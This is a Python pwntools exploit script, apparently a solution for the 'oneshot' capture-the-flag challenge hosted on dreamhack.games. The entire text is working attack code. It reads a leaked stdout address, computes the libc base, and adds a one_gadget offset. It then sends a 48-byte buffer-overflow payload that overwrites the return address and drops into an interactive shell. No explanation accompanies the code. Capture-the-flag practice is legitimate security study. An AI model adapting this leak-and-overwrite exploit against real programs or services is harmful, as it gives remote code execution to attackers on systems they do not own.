from pwn import *

def slog(n, m): return success(": ".join([n, hex(m)]))

one_gadget=0x45226

p = remote("host3.dreamhack.games", 19644)
e = ELF("./oneshot")
libc=ELF("./libc-2.23.so")

p.recvuntil("stdout: ")
stdout=int(p.recvline()[:-1], 16)
base = stdout - libc.symbols["_IO_2_1_stdout_"]
one_gadget=base+one_gadget


slog("STDOUT", stdout)
slog("base", base)
slog("one gadget", one_gadget)

payload = b'A'*24
payload += b'\x00'*8
payload += b'B'*8
payload += p64(one_gadget)

p.sendafter("MSG: ", payload)
p.interactive()
